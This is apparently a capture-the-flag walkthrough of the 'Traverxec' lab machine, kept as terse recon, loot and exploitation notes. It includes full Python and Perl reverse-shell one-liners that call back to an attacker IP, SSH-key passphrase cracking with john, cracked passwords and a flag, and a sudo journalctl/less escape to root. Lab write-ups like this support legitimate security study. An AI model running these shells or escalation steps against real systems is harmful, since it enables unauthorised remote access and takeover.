# RECON
- PORT 80
	Running web application probably PHP
	Web Application server running nostromo 1.9.6
	Mail service running on empty.html with parameters name,subject,mail,message
- Kernel version is `Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux`
- Trying payload export RHOST="10.10.14.162";export RPORT=9090;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' NOT WORKING
- Trying payload python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.162",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' NOT WORKING
- perl -e 'use Socket;$i="10.10.14.162";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' WORKED
- nhttpd had a vulnerability which was preventing anonymous users from accessing to user directory via setting `homedirs_public		public_www` this led me to try list /home/david/public_www/ and found protected directory which had backup for ssh login
- using `id_rsa` will not work because it has passphrase for it. So in order to crack it I have converted the id_rsa to john format using `ssh2john id_rsa` and ran john --fork=2 --wordlist=~/Documents/Dictionaries/rockyou.txt davidKey.hash

# LOOTS
- david@traverxec.htb
- david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ CRACKED => Nowonly4me
- david home backup on /home/david/public_www/protected/
- david `id_rsa` passphrase = hunter
- david flag : 7db0b48469606a42cec20750d9782f3d

# EXPLOITATION
- Vulnerable via nostromo remote code execution exploit. WWW-DATA user owned
- Getting root was a tricky one. The server-stats.sh script had executing journalctl as sudo so it has root permission and it specified the nhttpd service which was owned by www-data so its readable. Thus making the stty col small as possible for hanging the journalctl output. And after it hangs with stty col 10 run cmd on less using !/bin/bash and bash spawned by root prviliege
